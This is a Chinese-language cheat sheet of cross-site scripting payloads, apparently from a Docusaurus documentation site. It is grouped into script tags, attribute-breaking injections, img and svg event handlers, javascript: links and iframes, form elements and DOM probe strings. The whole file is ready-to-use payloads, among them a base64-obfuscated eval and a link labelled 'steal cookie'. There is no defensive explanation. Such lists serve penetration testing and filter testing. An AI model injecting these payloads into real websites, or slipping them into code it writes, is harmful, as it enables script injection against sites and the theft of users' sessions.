
注：因 docusaurus 不支持标签，所以用代码块注释

## 基础 script 标签

```
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>eval('alert(1)')</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>Function('alert(1)')()</script>
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',1000)</script>
```

## 闭合属性注入

```
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
"><img src=x onerror=alert(1)>
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
```

## img / svg 事件

```
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<img/src=x onerror=alert(1)>
<svg/onload=alert('XSS')>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

## 链接与 iframe

```
<a href="javascript:alert('XSS')">click me</a>
<a href="javascript:alert(document.cookie)">steal cookie</a>
<iframe src="javascript:alert('XSS')"></iframe>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

## 表单与输入

```
<input type="text" value="><script>alert('XSS')</script>">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<button onclick=alert(1)>click</button>
<form><button formaction="javascript:alert(1)">submit</button></form>
```

## DOM 型常用探测

```
#<script>alert(1)</script>
?search=<script>alert(1)</script>
?name=<img src=x onerror=alert(1)>
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```
